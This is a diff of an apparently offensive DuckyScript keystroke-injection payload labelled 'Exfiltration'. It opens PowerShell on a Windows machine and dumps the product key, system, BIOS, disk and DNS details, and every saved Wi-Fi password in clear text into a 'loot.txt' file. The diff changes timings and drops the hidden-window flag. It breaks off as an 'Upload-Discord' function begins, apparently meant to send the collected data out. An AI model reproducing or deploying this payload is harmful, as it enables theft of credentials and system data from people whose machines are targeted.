@@ -14,50 +14,46 @@ REM Category: Exfiltration
 
 GUI r
 DELAY 200
-STRING powershell -windowstyle hidden    
+STRING powershell   
 DELAY 200
 ENTER
-DELAY 200
+DELAY 500
 STRING Get-CimInstance -ClassName SoftwareLicensingService | Select-Object -ExpandProperty OA3xOriginalProductKey | Out-File C:\Users\Public\loot.txt -Force -append
 DELAY 200
 ENTER
-DELAY 200
-STRING Get-Process | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 200
-ENTER
-DELAY 200
+DELAY 500
 STRING Get-CimInstance -ClassName Win32_ComputerSystem | Out-File C:\Users\Public\loot.txt -Force -append
 DELAY 200
 ENTER
-DELAY 200
+DELAY 500
 STRING systeminfo | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 500
-ENTER
-DELAY 200
-STRING Get-DnsClient | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 200
-ENTER
-DELAY 200
-STRING Get-ComputerInfo | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 200
-ENTER
-DELAY 500
-STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 200
-ENTER
-DELAY 200
-STRING Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 200
-ENTER
-DELAY 200
-STRING Get-CimInstance -ClassName Win32_BIOS | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 200
-ENTER
-DELAY 200
-STRING Get-CimInstance -ClassName Win32_Processor | Select-Object -ExcludeProperty "CIM*" | Out-File C:\Users\Public\loot.txt -Force -append
 DELAY 200
 ENTER
 DELAY 2000
+STRING Get-DnsClient | Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 200
+ENTER
+DELAY 500
+STRING Get-ComputerInfo | Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 200
+ENTER
+DELAY 2000
+STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 200
+ENTER
+DELAY 500
+STRING Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" | Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 200
+ENTER
+DELAY 500
+STRING Get-CimInstance -ClassName Win32_BIOS | Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 200
+ENTER
+DELAY 500
+STRING Get-CimInstance -ClassName Win32_Processor | Select-Object -ExcludeProperty "CIM*" | Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 200
+ENTER
+DELAY 5000
 STRING function Upload-Discord {
 DELAY 500
 ENTER
